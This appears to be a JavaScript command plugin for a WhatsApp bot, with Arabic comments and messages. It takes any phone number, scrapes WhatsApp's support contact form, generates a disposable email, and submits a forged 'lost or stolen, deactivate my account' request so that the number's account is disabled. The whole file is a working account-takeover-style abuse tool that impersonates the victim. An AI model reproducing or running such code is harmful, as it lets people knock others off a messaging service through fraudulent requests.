import cheerio from "cheerio"
import axios from "axios"
import util from 'util'

let handler = async (m, { conn, args }) => {
  const q = args[0]
  if (!q) throw '*[❗] يرجى إدخال الرقم بصيغة دولية، مثال: +1XXXXXXXXX*'

  try {
    // جلب نموذج صفحة الدعم
    const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
    const cookie = ntah.headers["set-cookie"].join("; ")
    const $ = cheerio.load(ntah.data)
    const $form = $("form")
    const url = new URL($form.attr("action"), "https://www.whatsapp.com").href

    // توليد إيميل وهمي عشوائي
    const emailReq = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
    const email = emailReq.data[0]

    // تعبئة بيانات النموذج
    const form = new URLSearchParams()
    form.append("jazoest", $form.find("input[name=jazoest]").val())
    form.append("lsd", $form.find("input[name=lsd]").val())
    form.append("step", "submit")
    form.append("country_selector", "ID")
    form.append("phone_number", q)
    form.append("email", email)
    form.append("email_confirm", email)
    form.append("platform", "ANDROID")
    form.append("your_message", `Perdido/roubado: desative minha conta: ${q}`)
    form.append("__user", "0")
    form.append("__a", "1")

    // إرسال الطلب
    const res = await axios({
      url,
      method: "POST",
      data: form,
      headers: {
        "cookie": cookie,
        "content-type": "application/x-www-form-urlencoded"
      }
    })

    const payload = res.data.toString()

    if (payload.includes(`"payload":true`)) {
      return m.reply(`✅ تم إرسال الطلب بنجاح.\n\nتم تعطيل الحساب مؤقتًا وسيُحذف تلقائيًا خلال 30 يومًا إن لم تتم إعادة التسجيل.\n\n• يمكن للأصدقاء رؤية اسمك وصورتك.\n• الرسائل ستبقى معلقة حتى 30 يوم.\n\nلإعادة تنشيط الحساب، فقط أعد التسجيل باستخدام رمز التحقق.`)
    } else if (payload.includes(`"payload":false`)) {
      return m.reply(`⚠️ فشل الطلب.\n\nيرجى التأكد من أن الرقم يخصك، أرفق فاتورة أو عقد خدمة يثبت ملكيتك للرقم.\n\nوتأكد من إدخال الرقم بصيغة دولية.`)
    } else {
      // في حال رد غير متوقع
      return m.reply(util.format(JSON.parse(payload.replace("for (;;);", ""))))
    }

  } catch (err) {
    console.error(err)
    return m.reply("❌ حدث خطأ أثناء محاولة إرسال الطلب. حاول مرة أخرى.")
  }
}

handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true
export default handler